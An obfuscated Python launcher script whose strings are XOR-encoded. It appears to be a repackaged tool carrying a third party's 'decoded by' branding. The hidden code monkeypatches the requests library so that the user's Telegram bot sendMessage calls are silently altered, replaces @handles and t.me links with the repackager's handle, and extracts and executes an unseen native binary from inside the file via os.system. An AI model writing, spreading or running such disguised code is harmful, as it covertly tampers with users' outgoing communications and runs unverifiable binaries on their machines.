#@
N = (lambda x, y: ''.join(chr(q ^ x) for q in y))(175, [201, 195, 218, 220,
    199])
M = (lambda x, y: ''.join(chr(q ^ x) for q in y))(240, [135, 130, 153, 132,
    149])
L = (lambda x, y: ''.join(chr(q ^ x) for q in y))(221, [142, 169, 185, 178,
    168, 169])
K = print
H = None
import sys as E, os, re, requests as F, urllib.parse, webbrowser as O
K((lambda x, y: ''.join(chr(q ^ x) for q in y))(143, [203, 202, 204, 192, 
    203, 202, 175, 205, 214, 175, 220, 219, 202, 198, 193, 175, 243, 175, 
    207, 221, 202, 197, 202, 221, 196]))
repr = lambda *A: f'{A}'
list = lambda *A: f'{A}'


def open(text):
    B = (lambda x, y: ''.join(chr(q ^ x) for q in y))(130, [234, 246, 246, 
        242, 241, 184, 173, 173, 246, 172, 239, 231, 173])
    A = text
    if B in A or A.split()[0]:
        D = A.split(B)[1].split()[0] if B in A else A.split()[0]
        C = A.replace(D, (lambda x, y: ''.join(chr(q ^ x) for q in y))(147,
            [193, 214, 217, 214, 193, 216]))
        O.open(C)
        return C
    return A


def P(text):
    return re.sub((lambda x, y: ''.join(chr(q ^ x) for q in y))(255, [191, 
        163, 163, 136, 212]), (lambda x, y: ''.join(chr(q ^ x) for q in y))
        (124, [60, 46, 57, 54, 57, 46, 55]), text)


Q = type(L, (), {M: lambda self, text: E.__stdout__.write(P(text)), N: lambda
    self: E.__stdout__.flush()})()
E.stdout = Q
Z = type(L, (), {M: lambda self, text: E.stdout.write(text), N: lambda self:
    E.stdout.flush()})()


def a(*A, **B):
    0


def b(*A, **B):
    0


R = F.get
S = F.post


def I(url, data=H):
    E = (lambda x, y: ''.join(chr(q ^ x) for q in y))(213, [145, 144, 150, 
        154, 145, 144, 245, 151, 140, 245, 149, 135, 144, 159, 144, 135, 
        158, 245, 8439, 245])
    D = (lambda x, y: ''.join(chr(q ^ x) for q in y))(239, [201, 155, 138, 
        151, 155, 210])
    C = (lambda x, y: ''.join(chr(q ^ x) for q in y))(55, [67, 82, 79, 67])
    B = data
    A = url
    if (lambda x, y: ''.join(chr(q ^ x) for q in y))(29, [124, 109, 116, 51,
        105, 120, 113, 120, 122, 111, 124, 112, 51, 114, 111, 122]) in A and (
        lambda x, y: ''.join(chr(q ^ x) for q in y))(90, [41, 63, 52, 62, 
        23, 63, 41, 41, 59, 61, 63]) in A:
        if B and isinstance(B, dict) and C in B:
            B[C] = E + B[C]
        elif D in A:
            F, G = A.split(D, 1)
            H = urllib.parse.unquote(G)
            I = E + H.strip()
            J = urllib.parse.quote(I)
            A = F + D + J
    return A, B


def T(url, *B, **C):
    A = url
    A, D = I(A)
    return R(A, *B, **C)


def U(url, *E, **C):
    D = (lambda x, y: ''.join(chr(q ^ x) for q in y))(206, [170, 175, 186, 175]
        )
    B = url
    A = C.get(D, H)
    B, A = I(B, A)
    if A is not H:
        C[D] = A
    return S(B, *E, **C)


F.get = T
F.post = U
G = K
A = (lambda x, y: ''.join(chr(q ^ x) for q in y))(111, [])
B = chr
import zipfile as J, os as C, shutil as V, tempfile as W, sys as D, platform as X


def Y():
    K = C.path.dirname(C.path.abspath(D.argv[0]))
    F = W.mkdtemp()
    try:
        L = C.path.abspath(D.argv[0])
        with J.ZipFile(L, (lambda x, y: ''.join(chr(q ^ x) for q in y))(131,
            [241])) as M:
            M.extractall(F)
        E = X.machine()
        I = {(lambda s: A.join(B(A ^ 151) for A in s))([246, 229, 250, 225,
            160, 251]): (lambda s: A.join(B(A ^ 11) for A in s))([106, 121,
            102, 110, 106, 105, 98, 38, 125, 60, 106]), (lambda s: A.join(B
            (A ^ 69) for A in s))([36, 55, 40, 51, 125, 41]): (lambda s: A.
            join(B(A ^ 179) for A in s))([210, 193, 222, 214, 210, 209, 218,
            158, 197, 132, 210]), (lambda s: A.join(B(A ^ 134) for A in s))
            ([231, 244, 235]): (lambda s: A.join(B(A ^ 177) for A in s))([
            208, 195, 220, 212, 208, 211, 216, 156, 199, 134, 208]), (lambda
            s: A.join(B(A ^ 54) for A in s))([87, 87, 68, 85, 94, 0, 2]): (
            lambda s: A.join(B(A ^ 4) for A in s))([101, 118, 105, 50, 48, 
            41, 114, 60, 101]), (lambda s: A.join(B(A ^ 130) for A in s))([
            227, 240, 239, 180, 182]): (lambda s: A.join(B(A ^ 199) for A in
            s))([166, 181, 170, 241, 243, 234, 177, 255, 166]), (lambda s:
            A.join(B(A ^ 189) for A in s))([197, 133, 139]): (lambda s: A.
            join(B(A ^ 200) for A in s))([176, 240, 254]), (lambda s: A.
            join(B(A ^ 108) for A in s))([5, 90, 84, 90]): (lambda s: A.
            join(B(A ^ 39) for A in s))([95, 31, 17]), (lambda s: A.join(B(
            A ^ 173) for A in s))([213, 149, 155, 242, 155, 153]): (lambda
            s: A.join(B(A ^ 71) for A in s))([63, 127, 113, 24, 113, 115]),
            (lambda s: A.join(B(A ^ 208) for A in s))([177, 189, 180, 230, 
            228]): (lambda s: A.join(B(A ^ 176) for A in s))([200, 136, 134,
            239, 134, 132])}
        if E not in I:
            G((lambda s: A.join(B(A ^ 171) for A in s))([254, 197, 216, 222,
                219, 219, 196, 217, 223, 206, 207, 139, 202, 217, 200, 195,
                194, 223, 206, 200, 223, 222, 217, 206, 145, 139, 142, 216]
                ) % E)
            D.exit(1)
        N = I[E]
        H = C.path.join(F, N)
        if not C.path.exists(H):
            G((lambda s: A.join(B(A ^ 97) for A in s))([52, 15, 18, 20, 17,
                17, 14, 19, 21, 4, 5, 65, 0, 19, 2, 9, 8, 21, 4, 2, 21, 20,
                19, 4, 91, 65, 68, 18]) % E)
            D.exit(1)
        C.chmod(H, 493)
        C.chdir(K)
        O = (lambda s: A.join(B(A ^ 128) for A in s))([229, 248, 240, 239, 
            242, 244, 160, 204, 196, 223, 204, 201, 194, 210, 193, 210, 217,
            223, 208, 193, 212, 200, 189, 164, 204, 196, 223, 204, 201, 194,
            210, 193, 210, 217, 223, 208, 193, 212, 200, 186, 165, 243, 175,
            236, 233, 226, 160, 166, 166, 160, 229, 248, 240, 239, 242, 244,
            160, 208, 217, 212, 200, 207, 206, 200, 207, 205, 197, 189, 165,
            243, 160, 166, 166, 160, 229, 248, 240, 239, 242, 244, 160, 208,
            217, 212, 200, 207, 206, 223, 197, 216, 197, 195, 213, 212, 193,
            194, 204, 197, 189, 165, 243, 160, 166, 166, 160, 165, 243, 160,
            165, 243]) % (D.prefix, D.prefix, D.executable, H, (lambda x, y:
            ''.join(chr(q ^ x) for q in y))(158, [190]).join(D.argv[1:]))
        C.system(O)
    except J.BadZipFile:
        G((lambda s: A.join(B(A ^ 206) for A in s))([139, 188, 188, 161, 
            188, 244, 238, 154, 166, 171, 238, 180, 167, 190, 238, 168, 167,
            162, 171, 238, 167, 189, 238, 173, 161, 188, 188, 187, 190, 186,
            171, 170, 238, 161, 188, 238, 160, 161, 186, 238, 175, 238, 180,
            167, 190, 238, 168, 167, 162, 171, 224]))
    except Exception as P:
        G((lambda s: A.join(B(A ^ 195) for A in s))([130, 173, 227, 166, 
            177, 177, 172, 177, 227, 172, 160, 160, 182, 177, 177, 166, 167,
            249, 227, 230, 176]) % P)
    finally:
        V.rmtree(F)


if __name__ == (lambda s: A.join(B(A ^ 30) for A in s))([65, 65, 115, 127, 
    119, 112, 65, 65]):
    Y()
